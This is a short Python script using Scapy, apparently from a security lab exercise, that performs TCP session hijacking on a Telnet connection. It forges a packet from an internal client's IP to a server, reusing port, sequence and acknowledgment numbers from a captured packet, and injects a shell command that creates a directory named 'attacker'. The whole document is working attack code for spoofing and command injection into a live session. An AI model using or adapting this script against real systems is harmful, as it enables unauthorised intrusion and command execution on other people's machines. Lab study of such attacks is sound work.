import sys
#importing all libraries for scapy
from scapy.all import *

print("sending payload to internal server impersonating as internal client to create a directory called Attacker....")

#src is Internal client IP and dst is Internal server IP
IPLayer = IP (src="10.10.10.196", dst = "10.10.10.199")

#dport is 23 because this is a telnet connection.
#flag is A because we are also acknowledging the connection as client.
# sport, seq, ack are obained from latest tcp packet captured.
TCPLayer = TCP(sport=54560, dport=23, flags="A", seq=3782047083, ack=1989876258)

#the payload is the the data or the attack being sent by the attacker to the server to create a directory.
#the desination where the payload is executed must be specified.
Payload = "\n mkdir /home/msfadmin/attacker\n"

pkt=IPLayer/TCPLayer/Payload
ls(pkt)
send(pkt,verbose=0)